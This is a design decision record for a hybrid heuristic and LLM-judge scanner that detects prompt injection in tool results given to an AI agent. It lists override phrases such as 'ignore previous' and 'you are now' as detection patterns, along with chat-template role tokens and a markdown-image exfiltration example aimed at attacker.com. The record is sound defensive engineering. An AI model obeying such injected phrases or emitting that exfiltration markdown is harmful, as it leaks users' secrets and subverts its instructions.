# ADR-0005: Hybrid heuristic + LLM-judge injection scanner

- **Date:** 2026-05-14
- **Status:** Accepted
- **Deciders:** Jackson Anstee
- **Related requirements:** S-1, S-5

## Context

Prompt injection is the highest-impact, highest-frequency class of attack against tool-using LLM agents. The threat model: a tool returns attacker-controlled content (a web page, an email body, a file) that contains instructions the agent then follows.

Detection approaches in current practice:

1. **Pure heuristic** — regex/string-match for known injection patterns ("ignore previous instructions," role-switching phrases, base64 blobs, hidden Unicode tags). Fast, cheap, deterministic. Brittle and easily bypassed.
2. **Pure LLM judge** — a separate model call evaluates whether a tool result is trying to manipulate the primary agent. Robust against novel phrasings. Slow, expensive, and itself injectable.
3. **Hybrid** — heuristic first-pass for the cheap-and-obvious cases; LLM judge for the suspicious-but-ambiguous middle ground. Configurable threshold.

Constraints:

- **S-1** is a MUST; the scanner ships in v1.0.
- **N-1** implies the scanner must work without extra accounts. The LLM judge can use the same Claude API key the harness already has.
- Cost matters: scanning every tool result with an LLM judge would significantly inflate token spend for high-frequency tool use.

Public research the design draws on:
- Greshake et al., *Not what you've signed up for*, on indirect prompt injection.
- Simon Willison's running catalogue of injection examples.
- OWASP LLM Top 10 (2025 revision), categories LLM01 (Prompt Injection) and LLM02 (Insecure Output Handling).

## Decision

Implement a **hybrid heuristic + optional LLM-judge** scanner.

Pipeline:

1. **Heuristic pass (always on).** Pattern set targets:
   - Direct instruction phrases ("ignore previous," "you are now," "system:").
   - Role-impersonation tokens (`<|system|>`, common chat-template separators).
   - Hidden Unicode (tag characters, zero-width joiners) — strip and re-scan.
   - Base64 / hex blobs above a length threshold.
   - Markdown-image exfil patterns (`![](http://attacker.com/?q={secret})`).
2. **LLM-judge pass (off by default).** Triggered when:
   - The heuristic pass produces a "suspicious-but-not-confident" verdict, OR
   - The user has enabled `judge: always` in config.
3. **Verdict.** One of `pass`, `block`, `ask`. Block and ask events are logged with the offending content excerpts and rule IDs. *(Amended by [ADR-0012](./0012-injection-heuristics-implementation.md): the shipped API returns plural `rule_ids[]`/`excerpts[]` — one input can trip several rules. Heuristic stage implemented; LLM-judge is a typed seam, not yet built.)*

Configuration:

```yaml
security:
  injection:
    heuristic: on        # always-on
    judge: suspicious    # off | suspicious | always
    judge_model: claude-haiku-4-5  # cheap by default
    on_block: redact     # redact | drop | error
```

## Consequences

### Positive
- Fast default path. Heuristic-only catches the high-volume, low-sophistication attacks for near-zero cost.
- Tunable trade-off. Users with high-sensitivity agents flip judge to `always`; users with high-volume low-risk agents keep judge off.
- LLM judge uses the cheapest Claude model by default (Haiku), keeping cost manageable.
- Logs every block/ask event with rule ID and excerpt, feeding the eval layer's red-team scorecard.

### Negative
- The LLM judge is itself a target for injection. An adversary who knows the judge's prompt can craft input that both evades detection *and* manipulates the primary agent.
- Heuristic false positives will frustrate developers (legitimate strings containing "ignore" or base64).
- Configuration surface area adds documentation burden.

### Mitigations
- The judge's system prompt is treated as untrusted-input-aware: the prompt explicitly tells the judge that the content being evaluated is potentially adversarial and instructions inside it must not be followed.
- Heuristic rules ship with `confidence` scores; only high-confidence rules trigger blocks. Medium-confidence rules trigger judge pass or `ask`.
- Document common false-positive patterns and how to suppress per-call.

## Alternatives considered

1. **Heuristic only.** Cheap and fast but provably bypassable; would fail the red-team corpus pass-rate target (E-2, ≥90%).
2. **LLM judge only.** Robust but expensive; multiplies token cost on every tool call. Wrong default for a local-first harness aimed at solo devs.
3. **Outsource to a third-party scanner service** (e.g. Lakera, Prompt Armor). Violates N-1; pulls in accounts and billing. May provide as an optional plugin in v1.x.
4. **Fine-tune a small classifier model.** Out of scope for v1.0; would require training data and infra the project does not have.

## Revisit if

- The red-team pass rate falls below 90% — either heuristic ruleset or judge prompt needs work.
- LLM-judge cost dominates a typical agent run — consider caching judge verdicts on identical inputs, or moving to a fine-tuned classifier.
- A user-contributed scanner plugin proves materially better than the built-in pipeline — promote it to the default.
